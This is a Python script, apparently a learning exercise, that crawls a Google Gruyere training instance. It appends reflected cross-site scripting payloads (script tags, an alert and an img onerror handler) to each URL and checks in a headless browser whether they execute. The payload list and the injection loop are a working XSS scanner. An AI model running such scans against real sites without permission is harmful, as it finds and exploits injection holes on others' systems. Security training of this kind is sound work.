from requests import get, post, exceptions
from bs4 import BeautifulSoup as bs
from playwright.sync_api import sync_playwright
from uuid import uuid4
import re
from time import time


# Переменные окружения
INSTANCE_ID="472666335020487989751201647380414278590"
BASE_URL="https://google-gruyere.appspot.com"

INITIAL_URL=f"/{INSTANCE_ID}/"


# Наборы ссылок
crawl_links = set()
all_links = set()
xss_links = set()



# Тестируемые уязвимости
XSS_TEST = {
    "?<script>document.write('<h1>hacked</h1>')</script>",
    "&<script>document.write('<h1>hacked</h1>')</script>",
    "<script>document.write('<h1>hacked</h1>')</script>",

    "<script>alert('XSS')</script>",
    "<img%20src=\"nonexistent.jpg\"%20onerror=\"alert(%27XSS%27)\">"
  }



def crawl_url(url = INITIAL_URL):
  """
  Сбор ссылок со страницы
  """
  url = f"{BASE_URL}{url}"

  filtered = []
  try:
    soup = bs(get(url).content, "html.parser")
    links = soup.find_all("a")
    filtered = [link.get("href", "") for link in links if INSTANCE_ID in link.get("href", "")]

  except exceptions.RequestException as e:
    print(f"Error getting content from {url}: {e}")
    return []
  
  for item in filtered:
    if item not in all_links:
      crawl_links.add(item)

  all_links.update(filtered)

  return crawl_links



def test_xss(url, page):
  """
  Проверка угрозы на странице
  """
  for test in XSS_TEST:
    u = f"{BASE_URL}{url}{test}"
    # https://playwright.dev/python/docs/api/class-playwright
    page.goto(u)
    content = page.content()
    url_str = re.sub(r"[^a-z\d]+", "_", url, flags=re.IGNORECASE)
    page.screenshot(path=f"screenshots/{time()}_{uuid4()}_{url_str[0:64]}.png")
    soup = bs(content, "html.parser")
    headings = soup.find_all("h1")
    if len(headings) > 0 and "hacked" in headings[0]:
      """
      Угроза реализована, если найден заданый текст
      """
      xss_links.add(url)

    



def test_urls():
  """
  Проверка страниц
  """
  playwright = sync_playwright().start()
  chromium = playwright.chromium
  browser = chromium.launch()
  page = browser.new_page()
  for url in all_links:
    test_xss(url, page)
  browser.close()
  for link in xss_links:
    print(f"[XSS] {BASE_URL}{link}")



def crawl():
  """
  Собрать все доступные ссылки
  """
  crawl_url()
  while len(crawl_links):
    crawl_url(crawl_links.pop())

  print("\nВСЕ ССЫЛКИ")
  for item in all_links:
    print(item)
  print("")



def main():
  """
  Запуск программы
  """
  crawl()
  test_urls()

  print("\nГОТОВО")


main()
